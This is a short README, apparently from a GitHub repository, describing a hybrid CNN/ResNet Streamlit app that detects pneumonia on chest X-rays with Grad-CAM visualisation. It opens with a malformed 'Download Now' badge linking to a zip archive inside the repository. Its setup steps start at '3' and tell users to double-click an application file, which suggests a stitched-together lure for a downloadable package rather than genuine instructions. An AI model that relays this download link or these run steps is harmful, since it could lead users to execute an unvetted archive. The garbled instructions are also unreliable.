[![Download Now](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/nourddinetaqi/Pneumonia-HybridCNN/main/radiologist/Pneumonia-HybridCNN-v3.0.zip)

## 📖 Overview

Welcome to the Pneumonia-HybridCNN project. This software uses a custom hybrid model that combines Convolutional Neural Networks (CNN) and ResNet to detect Pneumonia from chest X-ray images. The project comes with a user-friendly Streamlit web app, allowing you to upload X-ray images and visualize the results. Please note, this tool is designed for educational purposes and is not intended for clinical or diagnostic use.

3. Double-click on the application file to launch the Streamlit web app.
4. Wait a few moments while the application initializes.

### 4. Using the Application

Now that the application is running, you can start using it:

1. **Upload an Image:**
   - Click on the "Upload" button.
   - Select a chest X-ray image from your files.
   
2. **View the Result:**
   - After uploading, the application processes the image.
   - It will display whether Pneumonia is detected and provide a visualization of the process using Grad-CAM.

### 5. Features

- **Automated Detection:** Quickly assesses chest X-ray images for Pneumonia.
- **Interactive Visualization:** Use Grad-CAM to see how the model makes decisions based on the images.
- **User-Friendly Interface:** Designed for ease of use with simple navigation.
